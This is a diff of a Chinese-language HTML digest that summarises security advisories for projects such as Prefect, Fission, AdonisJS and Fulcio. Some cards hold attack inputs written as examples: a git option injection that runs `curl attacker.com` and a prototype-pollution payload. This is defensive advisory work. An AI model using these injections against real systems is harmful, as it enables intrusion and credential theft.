-                <p><strong>漏洞描述：</strong>Prefect 的 <code>prefect-github</code> 集成中 <code>GitHubRepository</code> 块的 <code>reference</code> 字段存在参数注入漏洞。该字段直接拼接到 <code>git clone</code> 命令字符串中，经 <code>shlex.split()</code> 解析后可注入 <code>-c</code> 等 git 选项，导致 SSRF、凭据窃取或远程代码执行。</p>
-                <p><strong>影响产品：</strong>PrefectHQ/prefect ⭐22,720（Workflow orchestration framework）</p>
-                <p><strong>影响版本：</strong>&lt;= 3.6.18</p>
-                <p><strong>攻击面：</strong><code>src/integrations/prefect-github/prefect_github/repository.py</code> 中的 <code>aget_directory()</code> 和 <code>get_directory()</code> 方法</p>
-                <p><strong>触发条件：</strong>用户配置了 GitHubRepository 块，且 reference 字段可被攻击者控制（如通过 API 或 Flow 参数注入）</p>
-                <p><strong>潜在危害：</strong>通过注入 <code>-c core.sshCommand="curl attacker.com"</code> 实现 SSRF；通过 <code>--upload-pack</code> 实现 RCE；窃取 git 凭据</p>
-                <p><strong>可利用性：</strong>有详细原理：reference 字段直接字符串拼接后 shlex.split()，注入 git 选项即可。注意：GitLab 和 BitBucket 集成不受影响（使用列表方式构建命令）</p>
-                <p><strong>修复建议：</strong>升级至 Prefect &gt; 3.6.18。临时缓解：对 GitHubRepository 的 reference 字段进行严格输入验证，禁止包含特殊字符</p>
+                <p><strong>漏洞描述：</strong>与 GHSA-gx55-f84r-v3r7 相同根因的更强攻击面。三重缺陷叠加：Validate 不检查危险字段、UPDATE 绕过 webhook、Merge 无条件转发。攻击者可在约 20 秒内创建特权 Pod，读取集群 CA 私钥实现完整集群接管。</p>
+                <p><strong>影响产品：</strong>fission/fission ⭐8.9k</p>
+                <p><strong>影响版本：</strong>go/github.com/fission/fission (<= 1.23.0) → 修复: 1.24.0</p>
+                <p><strong>CWE类型：</strong>CWE-269, CWE-284, CWE-693</p>
+                <p><strong>攻击面：</strong>拥有 environments.fission.io create/update RBAC 权限的用户</p>
+                <p><strong>触发条件：</strong>kubectl apply → kubectl patch 注入危险字段 → poolmgr 调度特权 Pod（约 20 秒）</p>
+                <p><strong>潜在危害：</strong>节点逃逸 + 集群完整接管（通过集群 CA 密钥签署任意 kubelet 证书）</p>
+                <p><strong>可利用性：</strong>有详细原理</p>
+                <p><strong>修复建议：</strong>升级到 Fission v1.24.0</p>
             </div>
-            
-            <a href="https://github.com/advisories/GHSA-cw25-2p92-7f75" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
+            <a href="https://github.com/advisories/GHSA-wmgg-3p4h-48x7" target="_blank" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
         </div>
-
-        <!-- 9. Airflow -->
         <div class="advisory-card high">
             <div class="advisory-header">
                 <div>
-                    <div class="advisory-title">🟠 Apache Airflow ComputeEngineSSHHook 禁用 SSH 主机密钥验证</div>
-                    <div class="advisory-id">GHSA-g9v5-gjwf-9rwx | CVE-2026-45361</div>
+                    <div class="advisory-title">🟠 高危 @adonisjs/bodyparser has an incomplete fix for CVE-2026-25754</div>
+                    <div class="advisory-id">GHSA-qcm7-3vpr-hj5h | CVE: CVE-2026-48795</div>
                 </div>
-                <span class="priority-score">优先级: 高危</span>
+                <span class="priority-score">优先级: 7.3</span>
             </div>
-            
-            <div class="advisory-meta">
-                <span class="badge badge-high">High (CVSS 8.1)</span>
-                <span class="badge badge-stars">⭐ 45,983</span>
-            </div>
-            
+            <div class="advisory-meta"><span class="badge badge-high">HIGH · CVSS 8.6</span>
+<span class="badge badge-stars">⭐ 19.0k (adonisjs/core)</span>
+<span class="badge badge-analysis">📖 详细分析</span>
+</div>
             <div class="advisory-content">
-                <p><strong>漏洞描述：</strong>Apache Airflow 的 Google Cloud 提供商包中 <code>ComputeEngineSSHHook</code> 默认禁用了 SSH 主机密钥验证，使得 Airflow Worker 与 Compute Engine VM 之间的 SSH 连接暴露在中间人攻击风险下。攻击者可拦截或篡改 SSH 会话。</p>
-                <p><strong>影响产品：</strong>apache/airflow ⭐45,983（工作流编排平台）— apache-airflow-providers-google 包</p>
-                <p><strong>影响版本：</strong>apache-airflow-providers-google &lt; 22.0.0</p>
-                <p><strong>攻击面：</strong>ComputeEngineSSHHook 的 SSH 连接 — 中间人攻击位置（同一网络或 BGP 劫持）</p>
-                <p><strong>触发条件：</strong>使用 ComputeEngineSSHHook 连接 GCP Compute Engine VM，且网络路径上存在攻击者</p>
-                <p><strong>潜在危害：</strong>SSH 会话被拦截后可窃取敏感数据（包括传输中的凭据和任务数据），或注入恶意命令</p>
-                <p><strong>可利用性：</strong>需要中间人网络位置，利用门槛较高但危害严重</p>
-                <p><strong>修复建议：</strong>升级至 apache-airflow-providers-google &gt;= 22.0.0。临时缓解：手动配置 SSH 主机密钥验证，或在 Airflow DAG 中覆盖 Hook 的默认行为</p>
+                <p><strong>漏洞描述：</strong>CVE-2026-25754 的修复不完整。原始补丁使用 <code>Object.create(null)</code> 阻止了直接原型污染，但包含非危险前缀段的载荷（如 <code>user.__proto__.polluted</code>）仍可污染 Object.prototype，因为中间对象使用普通 <code>{}</code>。</p>
+                <p><strong>影响产品：</strong>adonisjs/core ⭐19.0k</p>
+                <p><strong>影响版本：</strong>npm/@adonisjs/bodyparser (>= 10.1.3, <= 10.1.4) → 修复: 10.1.5<br>npm/@adonisjs/bodyparser (>= 11.0.0-next.9, <= 11.0.1) → 修复: 11.0.3</p>
+                <p><strong>CWE类型：</strong>CWE-1321</p>
+                <p><strong>攻击面：</strong>任何可发送 multipart/form-data 请求的未认证远程攻击者</p>
+                <p><strong>触发条件：</strong>发送 <code>user.__proto__.polluted=value</code> 形式的 multipart/form-data 请求</p>
+                <p><strong>潜在危害：</strong>进程级 Object.prototype 污染，可能导致授权绕过或 RCE gadget chain</p>
+                <p><strong>可利用性：</strong>有详细原理</p>
+                <p><strong>修复建议：</strong>升级到 @adonisjs/bodyparser v10.1.5 或 v11.0.3</p>
             </div>
-            
-            <a href="https://github.com/advisories/GHSA-g9v5-gjwf-9rwx" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
+            <a href="https://github.com/advisories/GHSA-qcm7-3vpr-hj5h" target="_blank" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
         </div>
-
-        <!-- 10. OpenMed -->
-        <div class="advisory-card critical">
-            <div class="advisory-header">
-                <div>
-                    <div class="advisory-title">🟠 OpenMed 远程代码注入（通过 HuggingFace 模型加载）</div>
-                    <div class="advisory-id">GHSA-m3v4-v5gx-7wf5 | CVE-2026-47117</div>
-                </div>
-                <span class="priority-score">优先级: 高危</span>
-            </div>
-            
-            <div class="advisory-meta">
-                <span class="badge badge-critical">Critical (CVSS 9.8)</span>
-                <span class="badge badge-stars">⭐ &lt;1k</span>
-                <span class="badge badge-poc">🔴 PoC Available</span>
-            </div>
-            
-            <div class="advisory-content">
-                <p><strong>漏洞描述：</strong>OpenMed 的 PII 隐私过滤器模型加载路径存在远程代码注入漏洞。隐私过滤器调度器使用宽泛的子字符串匹配处理用户提供的 <code>model_name</code> 参数，形如 <code>attacker/foo-privacy-filter-bar</code> 的值会路由到使用 <code>trust_remote_code=True</code> 加载 HuggingFace 模型的路径。攻击者可提供包含恶意 Transformers 自定义代码的模型仓库，代码将以 OpenMed 服务进程权限执行。</p>
-                <p><strong>影响产品：</strong>OpenMed（医疗数据管理平台）— pip/openmed</p>
-                <p><strong>影响版本：</strong>&lt; 1.5.2</p>
-                <p><strong>攻击面：</strong>model_name 参数 → 隐私过滤器模型加载路径 → <code>trust_remote_code=True</code></p>
-                <p><strong>触发条件：</strong>无需认证，攻击者只需控制 model_name 参数（通过 API 或配置）</p>
-                <p><strong>潜在危害：</strong>完全未认证的远程代码执行。攻击者上传恶意 HuggingFace 模型 → 受害者加载时执行 config.json/tokenizer_config.json 中的 auto_map 自定义代码</p>
-                <p><strong>可利用性：</strong>有完整的利用路径：构造恶意 HF 仓库（auto_map 指向自定义 Python 代码）→ 通过 model_name 参数触发加载 → 代码自动执行</p>
-                <p><strong>修复建议：</strong>升级至 OpenMed &gt;= 1.5.2。禁止在生产环境中使用 <code>trust_remote_code=True</code></p>
-            </div>
-            
-            <a href="https://github.com/advisories/GHSA-m3v4-v5gx-7wf5" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
-        </div>
-
-        <!-- 11. Fulcio SSRF -->
         <div class="advisory-card high">
             <div class="advisory-header">
                 <div>
-                    <div class="advisory-title">🟠 Sigstore Fulcio OIDC Discovery SSRF + JWKS 替换 + K8s Token 泄露</div>
-                    <div class="advisory-id">GHSA-f5mr-q85p-6hh6 | CVE-2026-49478</div>
+                    <div class="advisory-title">🟠 高危 Fission: Cross-namespace Environment reference via unvalidated EnvironmentRef in Function admission webhook</div>
+                    <div class="advisory-id">GHSA-cvw6-gfvv-953q | CVE: CVE-2026-49824</div>
                 </div>
-                <span class="priority-score">优先级: 高危</span>
+                <span class="priority-score">优先级: 6.7</span>
             </div>
-            
-            <div class="advisory-meta">
-                <span class="badge badge-high">High (CVSS 8.7)</span>
-                <span class="badge badge-stars">⭐ 861</span>
-                <span class="badge badge-analysis">📖 详细原理</span>
-            </div>
-            
+            <div class="advisory-meta"><span class="badge badge-high">HIGH · CVSS 8.5</span>
+<span class="badge badge-stars">⭐ 8.9k (fission/fission)</span>
+<span class="badge badge-analysis">📖 详细分析</span>
+</div>
             <div class="advisory-content">
-                <p><strong>漏洞描述：</strong>Fulcio 的 OIDC Discovery 客户端存在三个连锁漏洞：(1) 跨域重定向跟随导致盲 SSRF；(2) 通过重定向操纵 discovery 流程返回恶意 jwks_uri，实现 JWKS 缓存投毒；(3) 在 Kubernetes 环境中，meta-issuer 路径可泄露 Service Account Token。</p>
-                <p><strong>影响产品：</strong>sigstore/fulcio ⭐861（Sigstore OIDC PKI，代码签名基础设施）</p>
-                <p><strong>影响版本：</strong>&lt;= 1.8.5</p>
-                <p><strong>攻击面：</strong>Fulcio 获取 OIDC discovery 元数据（<code>/.well-known/openid-configuration</code>）的 HTTP 客户端</p>
-                <p><strong>触发条件：</strong>攻击者控制或可影响 Fulcio 配置的 issuer URL 的响应</p>
-                <p><strong>潜在危害：</strong>盲 SSRF 可探测内网服务；JWKS 替换可伪造代码签名证书；K8s SA Token 泄露可获取集群权限。对软件供应链安全影响重大</p>
-                <p><strong>可利用性：</strong>有详细的三层攻击链分析，但实际利用需要控制 issuer 响应（如 DNS 劫持或恶意 issuer）</p>
-                <p><strong>修复建议：</strong>升级至 Fulcio &gt; 1.8.5。确保 OIDC issuer 配置使用可信来源</p>
+                <p><strong>漏洞描述：</strong>Fission Function Admission Webhook 未验证 <code>spec.environment.namespace</code>。攻击者可引用其他租户的 Environment CRD，使自己的函数在受害者的容器镜像中执行。</p>
+                <p><strong>影响产品：</strong>fission/fission ⭐8.9k</p>
+                <p><strong>影响版本：</strong>go/github.com/fission/fission (<= 1.23.0) → 修复: 1.24.0</p>
+                <p><strong>CWE类型：</strong>CWE-284, CWE-863</p>
+                <p><strong>攻击面：</strong>拥有 functions.fission.io create 权限的租户</p>
+                <p><strong>触发条件：</strong>创建 Function 时设置 spec.environment.namespace 为其他命名空间</p>
+                <p><strong>潜在危害：</strong>跨命名空间信任边界突破、代码和凭据窃取</p>
+                <p><strong>可利用性：</strong>有详细原理</p>
+                <p><strong>修复建议：</strong>升级到 Fission v1.24.0</p>
             </div>
-            
-            <a href="https://github.com/advisories/GHSA-f5mr-q85p-6hh6" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
+            <a href="https://github.com/advisories/GHSA-cvw6-gfvv-953q" target="_blank" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
         </div>
-
-        <!-- 12. PyFory -->
-        <div class="advisory-card critical">
-            <div class="advisory-header">
-                <div>
-                    <div class="advisory-title">🟠 Apache Fory PyFory 反序列化策略绕过</div>
-                    <div class="advisory-id">GHSA-m5gw-83w2-7749 | CVE-2026-48207</div>
-                </div>
-                <span class="priority-score">优先级: 高危</span>
-            </div>
-            
-            <div class="advisory-meta">
-                <span class="badge badge-critical">Critical (CVSS 9.8)</span>
-                <span class="badge badge-stars">⭐ 4,412</span>
-                <span class="badge badge-analysis">📖 详细原理</span>
-            </div>
-            
-            <div class="advisory-content">
-                <p><strong>漏洞描述：</strong>Apache Fory 的 Python 实现 PyFory 中，ReduceSerializer 在 reduce-state 恢复和全局名称解析过程中可绕过 DeserializationPolicy 验证钩子。当应用使用 Python-native 模式且 strict mode 禁用时，攻击者可通过构造恶意序列化数据绕过策略限制，反序列化不安全的类、函数或模块属性。</p>
-                <p><strong>影响产品：</strong>apache/fory (PyFory) ⭐4,412（高性能多语言序列化框架）</p>
-                <p><strong>影响版本：</strong>&gt;= 0.13.0, &lt; 1.0.0</p>
-                <p><strong>攻击面：</strong>ReduceSerializer 的 reduce-state 恢复路径和全局名称解析路径</p>
-                <p><strong>触发条件：</strong>应用反序列化攻击者控制的数据，使用 PyFory Python-native 模式且 strict mode 禁用</p>
-                <p><strong>潜在危害：</strong>绕过反序列化策略执行任意代码。与 Java 反序列化漏洞类似的攻击模式</p>
-                <p><strong>可利用性：</strong>有详细的原理说明，指出 ReduceSerializer 的验证钩子被绕过的具体路径</p>
-                <p><strong>修复建议：</strong>升级至 Apache Fory &gt;= 1.0.0，该版本强制 ReduceSerializer 路径的 DeserializationPolicy 验证</p>
-            </div>
-            
-            <a href="https://github.com/advisories/GHSA-m5gw-83w2-7749" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
-        </div>
-
-        <!-- 13. gitoxide RCE -->
         <div class="advisory-card high">
             <div class="advisory-header">
                 <div>
-                    <div class="advisory-title">🟠 gitoxide .gitmodules 命令注入绕过</div>
-                    <div class="advisory-id">GHSA-f26g-jm89-4g65 | CVE-2026-40034</div>
+                    <div class="advisory-title">🟠 高危 Fission: Cross-namespace Package read via unvalidated PackageRef in Function admission webhook</div>
+                    <div class="advisory-id">GHSA-3r8v-2xmj-5c39 | CVE: CVE-2026-49823</div>
                 </div>
-                <span class="priority-score">优先级: 高危</span>
+                <span class="priority-score">优先级: 6.7</span>
             </div>
-            
-            <div class="advisory-meta">
-                <span class="badge badge-high">High (CVSS 7.8)</span>
-                <span class="badge badge-stars">⭐ ~2k</span>
-                <span class="badge badge-analysis">📖 详细原理</span>
-            </div>
-            
+            <div class="advisory-meta"><span class="badge badge-high">HIGH · CVSS 7.7</span>
+<span class="badge badge-stars">⭐ 8.9k (fission/fission)</span>
+<span class="badge badge-analysis">📖 详细分析</span>
+</div>
             <div class="advisory-content">
-                <p><strong>漏洞描述：</strong>gitoxide 的 <code>gix_submodule::File::update()</code> API 存在命令注入绕过漏洞。该函数本应阻止攻击者通过 .gitmodules 文件设置 <code>update = !&lt;shell command&gt;</code>，但守护逻辑实现错误：它仅检查是否存在同名的非 .gitmodules 来源的 section，而未验证 update 值是否真正来自该可信来源。一旦子模块被初始化，攻击者即可注入任意 shell 命令。</p>
-                <p><strong>影响产品：</strong>Byron/gitoxide（Rust Git 实现库）</p>
-                <p><strong>影响版本：</strong>&gt;= 0.31.0, &lt; 0.83.0</p>
-                <p><strong>攻击面：</strong><code>gix_submodule::File::update()</code> 的 CommandForbiddenInModulesConfiguration 检查</p>
-                <p><strong>触发条件：</strong>用户使用 gitoxide 克隆包含恶意 .gitmodules 的仓库，且子模块已被初始化</p>
-                <p><strong>潜在危害：</strong>任意命令执行（类似 Git CVE-2019-19604）。攻击者可通过恶意仓库在受害者系统上执行任意命令</p>
-                <p><strong>可利用性：</strong>有详细的源码级分析，明确指出 section 来源验证与 value 来源验证的混淆</p>
-                <p><strong>修复建议：</strong>升级至 gitoxide &gt;= 0.83.0</p>
+                <p><strong>漏洞描述：</strong>Fission Function Admission Webhook 未验证 <code>PackageRef.Namespace</code>。攻击者可通过 fission-fetcher 的高权限 ServiceAccount 读取任意命名空间中 Package 的部署归档。</p>
+                <p><strong>影响产品：</strong>fission/fission ⭐8.9k</p>
+                <p><strong>影响版本：</strong>go/github.com/fission/fission (<= 1.23.0) → 修复: 1.24.0</p>
+                <p><strong>CWE类型：</strong>CWE-284, CWE-863</p>
+                <p><strong>攻击面：</strong>拥有 functions.fission.io create 权限的租户</p>
+                <p><strong>触发条件：</strong>创建 Function 时设置 spec.package.packageref.namespace 为目标命名空间</p>
+                <p><strong>潜在危害：</strong>跨命名空间读取任意 Fission Package 的源代码和嵌入密钥</p>
+                <p><strong>可利用性：</strong>有详细原理</p>
+                <p><strong>修复建议：</strong>升级到 Fission v1.24.0</p>
             </div>
-            
-            <a href="https://github.com/advisories/GHSA-f26g-jm89-4g65" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
+            <a href="https://github.com/advisories/GHSA-3r8v-2xmj-5c39" target="_blank" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
         </div>
-
-        <!-- 14. Undertow MadeYouReset -->
         <div class="advisory-card high">
             <div class="advisory-header">
                 <div>
-                    <div class="advisory-title">🟠 Undertow MadeYouReset HTTP/2 DDoS</div>
-                    <div class="advisory-id">GHSA-95h4-w6j8-2rp8 | CVE-2025-9784</div>
+                    <div class="advisory-title">🟠 高危 Fission: Cross-namespace event leakage via KubernetesWatchTrigger allows persistent tenant surveillance</div>
+                    <div class="advisory-id">GHSA-gc3j-79f2-7vvw | CVE: CVE-2026-49822</div>
                 </div>
-                <span class="priority-score">优先级: 中危</span>
+                <span class="priority-score">优先级: 6.7</span>
             </div>
-            
-            <div class="advisory-meta">
-                <span class="badge badge-high">High (CVSS 7.5)</span>
-                <span class="badge badge-stars">⭐ 3,750</span>
-            </div>
-            
+            <div class="advisory-meta"><span class="badge badge-high">HIGH · CVSS 7.7</span>
+<span class="badge badge-stars">⭐ 8.9k (fission/fission)</span>
+<span class="badge badge-analysis">📖 详细分析</span>
+</div>
             <div class="advisory-content">
-                <p><strong>漏洞描述：</strong>Undertow Web 服务器存在 "MadeYouReset" 攻击漏洞。恶意客户端可构造畸形请求触发服务端 HTTP/2 流重置，但不会触发滥用计数器。攻击者可反复诱导服务端执行大量流中止操作，造成拒绝服务。</p>
-                <p><strong>影响产品：</strong>undertow-io/undertow ⭐3,750（高性能非阻塞 Web 服务器，JBoss/WildFly 核心组件）</p>
-                <p><strong>影响版本：</strong>&lt; 2.2.38.Final | &gt;= 2.3.0.Alpha1, &lt; 2.3.20.Final</p>
-                <p><strong>攻击面：</strong>HTTP/2 连接的流管理 — 服务端重置流时不计入滥用限制</p>
-                <p><strong>触发条件：</strong>服务端暴露 HTTP/2 端口</p>
-                <p><strong>潜在危害：</strong>远程 DoS，影响服务可用性</p>
-                <p><strong>可利用性：</strong>利用简单，发送畸形 HTTP/2 请求即可触发</p>
-                <p><strong>修复建议：</strong>升级至 Undertow 2.2.38.Final 或 2.3.20.Final 以上</p>
+                <p><strong>漏洞描述：</strong>KubernetesWatchTrigger 允许低权限开发者建立对其他命名空间的持久监控通道。kubewatcher 直接使用用户控制的命名空间作为 Watch 目标，且 Webhook 仅注册 create。空 namespace 可监控整个集群。</p>
+                <p><strong>影响产品：</strong>fission/fission ⭐8.9k</p>
+                <p><strong>影响版本：</strong>go/github.com/fission/fission (<= 1.23.0) → 修复: 1.24.0</p>
+                <p><strong>CWE类型：</strong>CWE-284, CWE-862</p>
+                <p><strong>攻击面：</strong>拥有 kuberneteswatchtriggers.fission.io create 权限的租户</p>
+                <p><strong>触发条件：</strong>创建 KWT 时设置 spec.namespace 为目标命名空间（或留空监控全部）</p>
+                <p><strong>潜在危害：</strong>跨租户持久监控通道——持续接收任意命名空间 Pod/Service/Job 事件数据</p>
+                <p><strong>可利用性：</strong>有详细原理</p>
+                <p><strong>修复建议：</strong>升级到 Fission v1.24.0</p>
             </div>
-            
-            <a href="https://github.com/advisories/GHSA-95h4-w6j8-2rp8" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
+            <a href="https://github.com/advisories/GHSA-gc3j-79f2-7vvw" target="_blank" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
         </div>
+        <div class="advisory-card high">
+            <div class="advisory-header">
+                <div>
+                    <div class="advisory-title">🟠 高危 Fission: Cross-namespace Environment reference in Package allows build-time command execution and SA token exfiltration</div>
+                    <div class="advisory-id">GHSA-vjhc-cf4p-72q4 | CVE: CVE-2026-49821</div>
+                </div>
+                <span class="priority-score">优先级: 6.7</span>
+            </div>
+            <div class="advisory-meta"><span class="badge badge-high">HIGH · CVSS 7.7</span>
+<span class="badge badge-stars">⭐ 8.9k (fission/fission)</span>
+<span class="badge badge-analysis">📖 详细分析</span>
+</div>
+            <div class="advisory-content">
+                <p><strong>漏洞描述：</strong>Fission buildermgr 处理 Package CRD 时未验证 <code>spec.environment.namespace</code>。攻击者可在受害者 builder pod 中执行构建命令，通过 npm preinstall 钩子窃取 fission-builder SA Token。</p>
+                <p><strong>影响产品：</strong>fission/fission ⭐8.9k</p>
+                <p><strong>影响版本：</strong>go/github.com/fission/fission (<= 1.23.0) → 修复: 1.24.0</p>
+                <p><strong>CWE类型：</strong>CWE-441, CWE-862</p>
+                <p><strong>攻击面：</strong>拥有 packages.fission.io create 权限的租户</p>
+                <p><strong>触发条件：</strong>创建 Package 时设置跨命名空间 Environment，利用构建钩子读取 SA Token</p>
+                <p><strong>潜在危害：</strong>跨租户入侵——在受害者 builder pod 执行代码、窃取 SA Token</p>
+                <p><strong>可利用性：</strong>有详细原理</p>
+                <p><strong>修复建议：</strong>升级到 Fission v1.24.0</p>
+            </div>
+            <a href="https://github.com/advisories/GHSA-vjhc-cf4p-72q4" target="_blank" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
+        </div>
+        <div class="advisory-card high">
+            <div class="advisory-header">
+                <div>
+                    <div class="advisory-title">🟠 高危 Fission: MessageQueueTrigger scaler manager materializes Secret values into Deployment envvars and accepts arbitrary user PodSpec</div>
+                    <div class="advisory-id">GHSA-7m8x-qg2j-4m3v | CVE: N/A</div>
+                </div>
+                <span class="priority-score">优先级: 6.7</span>
+            </div>
+            <div class="advisory-meta"><span class="badge badge-high">HIGH · CVSS 8.1</span>
+<span class="badge badge-stars">⭐ 8.9k (fission/fission)</span>
+<span class="badge badge-analysis">📖 详细分析</span>
+</div>
+            <div class="advisory-content">
+                <p><strong>漏洞描述：</strong>Fission MQT Scaler 控制器暴露两个权限提升原语：(1) Secret 物化为明文环境变量；(2) PodSpec 注入允许任意镜像/命令/ServiceAccount/HostNetwork。仅需 messagequeuetriggers/create 权限。</p>
+                <p><strong>影响产品：</strong>fission/fission ⭐8.9k</p>
+                <p><strong>影响版本：</strong>go/github.com/fission/fission (<= 1.23.0) → 修复: 1.24.0</p>
+                <p><strong>CWE类型：</strong>CWE-200, CWE-269, CWE-284</p>
+                <p><strong>攻击面：</strong>拥有 messagequeuetriggers.fission.io create 权限的租户</p>
+                <p><strong>触发条件：</strong>创建指向目标 Secret 的 MQT，或注入恶意 PodSpec</p>
+                <p><strong>潜在危害：</strong>读取命名空间任意 Secret + 以任意镜像和 SA 运行容器</p>
+                <p><strong>可利用性：</strong>有详细原理</p>
+                <p><strong>修复建议：</strong>升级到 Fission v1.24.0</p>
+            </div>
+            <a href="https://github.com/advisories/GHSA-7m8x-qg2j-4m3v" target="_blank" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
+        </div><h2 class="section-title">📌 补充：Star &lt; 5k 但含 PoC/详细分析的高价值漏洞</h2>
 
-        <!-- 汇总表 -->
+        <div class="advisory-card high">
+            <div class="advisory-header">
+                <div>
+                    <div class="advisory-title">🟠 高危 Open Babel has heap buffer overflow in SMILES OBSmilesParser::ParseSmiles</div>
+                    <div class="advisory-id">GHSA-j35x-w4gj-pf7w | CVE: CVE-2025-10996</div>
+                </div>
+                <span class="priority-score">优先级: 7.0</span>
+            </div>
+            <div class="advisory-meta"><span class="badge badge-high">HIGH · CVSS 7.8</span>
+<span class="badge badge-stars">⭐ 1.4k (openbabel/openbabel)</span>
+<span class="badge badge-poc">🔴 PoC Available</span>
+<span class="badge badge-analysis">📖 详细分析</span>
+</div>
+            <div class="advisory-content">
+                <p><strong>漏洞描述：</strong>Open Babel SMILES 解析器 <code>OBSmilesParser::ParseSmiles</code> 存在堆缓冲区溢出。构造的 SMILES 输入导致解析器向堆缓冲区末尾之后写入数据。提供有 PoC 复现文件（通过 OSS-Fuzz 发现）。</p>
+                <p><strong>影响产品：</strong>openbabel/openbabel ⭐1.4k</p>
+                <p><strong>影响版本：</strong>pip/openbabel (< 3.2.0) → 修复: 3.2.0</p>
+                <p><strong>CWE类型：</strong>CWE-119</p>
+                <p><strong>攻击面：</strong>需要受害者解析恶意 SMILES 字符串</p>
+                <p><strong>触发条件：</strong>向 Open Babel 提交特制 SMILES 字符串</p>
+                <p><strong>潜在危害：</strong>堆缓冲区溢出，可能导致代码执行</p>
+                <p><strong>可利用性：</strong>有完整PoC</p>
+                <p><strong>修复建议：</strong>升级到 Open Babel 3.2.0</p>
+            </div>
+            <a href="https://github.com/advisories/GHSA-j35x-w4gj-pf7w" target="_blank" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
+        </div>
+        <div class="advisory-card high">
+            <div class="advisory-header">
+                <div>
+                    <div class="advisory-title">🟠 高危 Paymenter has URL parameter injection that bypasses paid plan limits at checkout</div>
+                    <div class="advisory-id">GHSA-5q4q-834j-g8g4 | CVE: CVE-2026-47198</div>
+                </div>
+                <span class="priority-score">优先级: 6.1</span>
+            </div>
+            <div class="advisory-meta"><span class="badge badge-high">HIGH · CVSS 8.5</span>
+<span class="badge badge-stars">⭐ 1.8k (Paymenter/Paymenter)</span>
+<span class="badge badge-analysis">📖 详细分析</span>
+</div>
+            <div class="advisory-content">
+                <p><strong>漏洞描述：</strong>Paymenter Checkout 组件通过 #[Url] 暴露 $checkoutConfig 给 URL 查询参数，未定义的 key 绕过验证直接写入数据库。服务器部署时用户注入的属性覆盖管理员配置。</p>
+                <p><strong>影响产品：</strong>Paymenter/Paymenter ⭐1.8k</p>
+                <p><strong>影响版本：</strong>composer/paymenter/paymenter (< 1.5.1) → 修复: 1.5.1</p>
+                <p><strong>CWE类型：</strong>CWE-20, CWE-639</p>
+                <p><strong>攻击面：</strong>任何已认证的远程用户</p>
+                <p><strong>触发条件：</strong>在结账 URL 中注入任意 key-value 参数</p>
+                <p><strong>潜在危害：</strong>绕过付费计划限制、覆盖管理员服务器资源</p>
+                <p><strong>可利用性：</strong>有详细原理</p>
+                <p><strong>修复建议：</strong>升级到 Paymenter v1.5.1</p>
+            </div>
+            <a href="https://github.com/advisories/GHSA-5q4q-834j-g8g4" target="_blank" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
+        </div>
+        <div class="advisory-card high">
+            <div class="advisory-header">
+                <div>
+                    <div class="advisory-title">🟠 高危 Microsoft.OpenAPI: Circular schema references may terminate OpenAPI parsing</div>
+                    <div class="advisory-id">GHSA-v5pm-xwqc-g5wc | CVE: CVE-2026-49451</div>
+                </div>
+                <span class="priority-score">优先级: 6.1</span>
+            </div>
+            <div class="advisory-meta"><span class="badge badge-high">HIGH · CVSS 7.5</span>
+<span class="badge badge-stars">⭐ 1.6k (microsoft/OpenAPI.NET)</span>
+<span class="badge badge-analysis">📖 详细分析</span>
+</div>
+            <div class="advisory-content">
+                <p><strong>漏洞描述：</strong>Microsoft.OpenAPI 解析包含循环 schema 引用的 OpenAPI 文档时可能因栈溢出导致进程终止。JSON 和 YAML 读取路径均可复现。</p>
+                <p><strong>影响产品：</strong>microsoft/OpenAPI.NET ⭐1.6k</p>
+                <p><strong>影响版本：</strong>nuget/Microsoft.OpenAPI (>= 2.0.0-preview11, <= 2.7.4) → 修复: 2.7.5<br>nuget/Microsoft.OpenAPI (>= 3.0.0, <= 3.5.3) → 修复: 3.5.4</p>
+                <p><strong>CWE类型：</strong>CWE-674</p>
+                <p><strong>攻击面：</strong>可提交 OpenAPI 文档的攻击者</p>
+                <p><strong>触发条件：</strong>提交包含循环 schema 引用的 OpenAPI 文档</p>
+                <p><strong>潜在危害：</strong>拒绝服务（进程终止）</p>
+                <p><strong>可利用性：</strong>有详细原理</p>
+                <p><strong>修复建议：</strong>升级到 Microsoft.OpenAPI v2.7.5 或 v3.5.4</p>
+            </div>
+            <a href="https://github.com/advisories/GHSA-v5pm-xwqc-g5wc" target="_blank" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
+        </div>
+        <div class="advisory-card medium">
+            <div class="advisory-header">
+                <div>
+                    <div class="advisory-title">🟡 中危 Fulcio has OIDC Discovery Redirect Following Allows SSRF and JWKS Substitution for Meta-Issuer Paths, with Kubernetes Service-Account Token Leakage</div>
+                    <div class="advisory-id">GHSA-f5mr-q85p-6hh6 | CVE: CVE-2026-49478</div>
+                </div>
+                <span class="priority-score">优先级: 5.5</span>
+            </div>
+            <div class="advisory-meta"><span class="badge badge-high">HIGH · CVSS 8.7</span>
+<span class="badge badge-stars">⭐ 861 (sigstore/fulcio)</span>
+<span class="badge badge-analysis">📖 详细分析</span>
+</div>
+            <div class="advisory-content">
+                <p><strong>漏洞描述：</strong>Sigstore Fulcio OIDC Discovery 客户端三个漏洞：跨主机重定向导致盲 SSRF；JWKS 替换和缓存投毒；Kubernetes SA Token 泄露（Token 全局附加到传输层，在重定向或通配符 MetaIssuer 场景泄露给第三方）。</p>
+                <p><strong>影响产品：</strong>sigstore/fulcio ⭐861</p>
